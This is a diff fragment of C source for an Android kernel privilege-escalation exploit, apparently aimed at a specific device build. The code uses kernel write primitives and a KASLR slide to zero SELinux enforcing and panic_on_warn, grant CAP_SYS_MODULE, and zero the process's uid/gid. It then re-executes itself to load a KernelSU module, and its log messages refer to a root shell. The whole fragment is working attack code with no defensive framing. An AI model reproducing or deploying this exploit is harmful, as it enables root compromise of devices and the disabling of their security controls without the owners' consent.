+                                (char *)"ksu-worker", NULL};
+            char *const ep[] = {
+                (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
+                (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
+                (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
+                NULL};
 
-            execve("/system/bin/sh", av, envp);
+            execve("/proc/self/exe", av, ep);
             _exit(127);
         }
-        if (w > 0)
-            waitpid(w, &st, 0);
-        logf("[fake] worker exit=%#x\n", st);
+        if (worker > 0)
+            (void)waitpid(worker, &worker_status, 0);
+        for (int i = 0; i < 50 && !loaded; i++)
+        {
+            loaded = kernelsu_module_loaded();
+            if (!loaded)
+                usleep(100000);
+        }
+        logf("[ksu] worker=%d status=%#x loaded=%d\n",
+             worker, worker_status, loaded);
+        kptr_restrict_restore_ret =
+            set_kptr_restrict(kptr_restrict_original);
+        selinux_restore_ret = restore_selinux_enforcing();
+        logf("[ksu] cleanup kptr=%d selinux=%d\n",
+             kptr_restrict_restore_ret, selinux_restore_ret);
+        if (worker <= 0 || !WIFEXITED(worker_status) ||
+            WEXITSTATUS(worker_status) != 0 || !loaded)
+            _exit(6);
+        /**
+         * @note Mechanical change: use the unconditional cleanup readback above
+         *       so both loader success and loader failure restore kernel state.
+         */
+        if (kptr_restrict_restore_ret != 0 || selinux_restore_ret != 0)
+        {
+            logf("[ksu] module loaded but kernel-state restore failed\n");
+            _exit(7);
+        }
+        logf("KSU_LOADED enforce=1\n");
         _exit(0);
     }
 
-    /*
+    /**
      * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
      * across execve(), cap_bprm's setgid downgrade intersects permitted with
      * the old (empty) set and the expanded bset never becomes effective.
@@ -1848,6 +2282,8 @@ int main(int argc, char **argv)
     int report_ok = 0, child_ok = 0;
 
     setvbuf(stdout, NULL, _IONBF, 0);
+    if (argc > 1 && !strcmp(argv[1], "ksu-worker"))
+        return ksu_worker_main();
     if (argc > 1 && !strcmp(argv[1], "wait"))
         return wait_child_main(argc > 2 ? argv[2] : "verify");
 
@@ -1885,6 +2321,11 @@ int main(int argc, char **argv)
     logf("[target] id=%s params=%s kmi=%s\n", GLK98260_TARGET_ID,
          GLK98260_PARAM_REVISION, GLK98260_KSU_KMI);
     logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
+    if (configure_trace_buffer() != 0)
+    {
+        logf("[-] trace buffer preflight failed\n");
+        return 1;
+    }
     enable_events();
     kick_rss();
     usleep(50000);
@@ -1947,8 +2388,14 @@ int main(int argc, char **argv)
          GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
              ? "shared-mm-core_state"
              : "killable-mmap-lock");
-    if (g_fake_stage)
-        write_ksu_script();
+    if (g_fake_stage && prepare_ksud() != 0)
+    {
+        close(go_fd);
+        close(st_fd);
+        kill(C, SIGKILL);
+        waitpid(C, NULL, 0);
+        return 1;
+    }
     if (ensure_pool() || ensure_raw())
     {
         logf("[-] armed resource preflight failed\n");
@@ -1991,39 +2438,57 @@ int main(int argc, char **argv)
     }
     else
     {
-        struct plant_res fc;
+        struct plant_res cap_inh, cap_prm;
+        struct child_report verify_rep;
+        unsigned long long cap_inh_value, cap_prm_value;
 
-        if (!g_child_task)
-            park_forever("child task not leaked");
         if (!g_slide_ready)
             park_forever("no KASLR slide");
-        /*
-         * Zeroing the byte at selinux_state.enforcing also makes the sysctl
-         * readable. panic_on_warn is then cleared before the self-parent
-         * fake-cred erase can reach RB_EMPTY_NODE WARN.
+        if (stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
+                        "panic_on_warn", raw, NULL))
+            park_forever("panic_on_warn write failed");
+        memset(&cap_inh, 0, sizeof(cap_inh));
+        if (stage_write(R + GLK98260_CRED_CAP_INHERITABLE_OFF, 1,
+                        "cap_inheritable", raw, &cap_inh))
+            park_forever("CAP_SYS_MODULE inheritable write failed");
+        cap_inh_value = read_child_status_hex(C, "CapInh");
+        logf("[ksu-verify] A=%#llx CapInh=%#llx required=%#llx\n",
+             cap_inh.A, cap_inh_value, GLK98260_CAP_SYS_MODULE_MASK);
+        if (!(cap_inh_value & GLK98260_CAP_SYS_MODULE_MASK))
+            park_forever("CAP_SYS_MODULE inheritable readback failed");
+        memset(&cap_prm, 0, sizeof(cap_prm));
+        if (stage_write(R + GLK98260_CRED_CAP_PERMITTED_OFF, 1,
+                        "cap_permitted", raw, &cap_prm))
+            park_forever("CAP_SYS_MODULE permitted write failed");
+        cap_prm_value = read_child_status_hex(C, "CapPrm");
+        logf("[ksu-verify] A=%#llx CapPrm=%#llx required=%#llx\n",
+             cap_prm.A, cap_prm_value, GLK98260_CAP_SYS_MODULE_MASK);
+        if (!(cap_prm_value & GLK98260_CAP_SYS_MODULE_MASK))
+            park_forever("CAP_SYS_MODULE permitted readback failed");
+        /**
+         * Clearing enforcing makes module loading reachable from the shell
+         * domain.  panic_on_warn is cleared first because the self-parent
+         * pointer plant can reach the RB_EMPTY_NODE warning path.
          */
-        logf("[+] fake preflight selinux_state=%#llx\n",
+        logf("[+] KSU preflight selinux_state=%#llx\n",
              SELINUX_STATE_STATIC + g_slide);
         if (stage_write(SELINUX_STATE_STATIC + g_slide +
                             GLK98260_SELINUX_ENFORCING_OFF -
                             GLK98260_SELINUX_ZERO_WRITE_BIAS,
-                        0,
-                        "selinux", raw, NULL))
+                        0, "selinux", raw, NULL))
             park_forever("selinux write failed");
-        if (read_panic_on_warn() != 0 &&
-            stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
-                        "panic_on_warn", raw, NULL))
-            park_forever("panic_on_warn write failed");
-        memset(&fc, 0, sizeof(fc));
-        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
-                        raw, &fc))
-            park_forever("fake cred write failed");
-        logf("[+] fake cred A=%#llx\n", fc.A);
-        if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
-            park_forever("fake uid fix failed");
-        if (stage_write(fc.A + GLK98260_CRED_SGID_OFF, 0,
-                        "fake_sgid_euid", raw, NULL))
-            park_forever("fake sgid/euid fix failed");
+        if (read_panic_on_warn() != 0)
+            park_forever("panic_on_warn zero readback failed");
+        if (stage_write(R + CRED_UID_OFF, 0, "loader_uid_gid", raw, NULL))
+            park_forever("loader uid/gid write failed");
+        if (child_command_report(go_fd, st_fd,
+                                 GLK98260_CHILD_COMMAND_VERIFY,
+                                 &verify_rep))
+            park_forever("loader uid readback missing");
+        logf("[ksu-verify] uid=%d euid=%d\n", verify_rep.uid,
+             verify_rep.euid);
+        if (verify_rep.uid != 0)
+            park_forever("loader uid readback failed");
     }
     logf("[+] write stages complete, committing child\n");
 
@@ -2046,18 +2511,41 @@ int main(int argc, char **argv)
         if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
         {
             logf("[+] child report uid=%d euid=%d setgid=%d/%d setuid=%d/%d "
-                 "resuid=%d/%d/%d\n",
+                 "resuid=%d/%d/%d fsuid=%d fsgid=%d ambient=%d/%d\n",
                  rep.uid, rep.euid, rep.setgid_ret, rep.setgid_errno,
                  rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid,
-                 rep.rsuid);
+                 rep.rsuid, rep.fsuid, rep.fsgid, rep.ambient_ret,
+                 rep.ambient_errno);
             if (g_fake_stage)
-                report_ok = rep.uid == 0 && rep.euid == 0;
-            else
+            {
+                /**
+                 * The report captures uid/euid before the transition and
+                 * confirms the same real-cred setuid path as the shell gate,
+                 * plus the ambient-capability promotion required by ksud.
+                 */
                 report_ok =
                     rep.uid == 0 &&
                     rep.euid == (int)GLK98260_EXPECTED_SHELL_ID &&
                     rep.setgid_ret == 0 && rep.setuid_ret == 0 &&
-                    rep.ruid == 0 && rep.reuid == 0 && rep.rsuid == 0;
+                    rep.ruid == 0 && rep.reuid == 0 &&
+                    rep.rsuid == (int)GLK98260_EXPECTED_SHELL_ID &&
+                    rep.fsuid == 0 && rep.fsgid == 0 &&
+                    rep.ambient_ret == 0;
+            }
+            else
+            {
+                /**
+                 * The zero write changes real uid/gid only.  From an
+                 * unprivileged euid, setuid(real_uid) changes the effective
+                 * uid while POSIX preserves the original saved uid.
+                 */
+                report_ok =
+                    rep.uid == 0 &&
+                    rep.euid == (int)GLK98260_EXPECTED_SHELL_ID &&
+                    rep.setgid_ret == 0 && rep.setuid_ret == 0 &&
+                    rep.ruid == 0 && rep.reuid == 0 &&
+                    rep.rsuid == (int)GLK98260_EXPECTED_SHELL_ID;
+            }
             if (!report_ok)
                 logf("[!] child acceptance fields mismatch\n");
         }
@@ -2078,10 +2566,12 @@ int main(int argc, char **argv)
     }
     if (g_fake_stage)
     {
-        logf("[%s] fake child handoff report=%d child=%d must_reboot=1\n",
-             report_ok && child_ok ? "FAKE_CHILD_PASS" : "FAKE_CHILD_FAIL",
+        logf("[%s] KSU child handoff report=%d child=%d must_reboot=1\n",
+             report_ok && child_ok ? "KSU_HANDOFF_PASS" : "KSU_HANDOFF_FAIL",
              report_ok, child_ok);
-        park_forever("fake cred page held; reboot to clean");
+        if (g_held)
+            park_forever("KSU handoff finished with held reclaim zombies");
+        return report_ok && child_ok ? 0 : 2;
     }
     if (g_held)
         park_forever("root shell finished; failed-plant zombies are held");
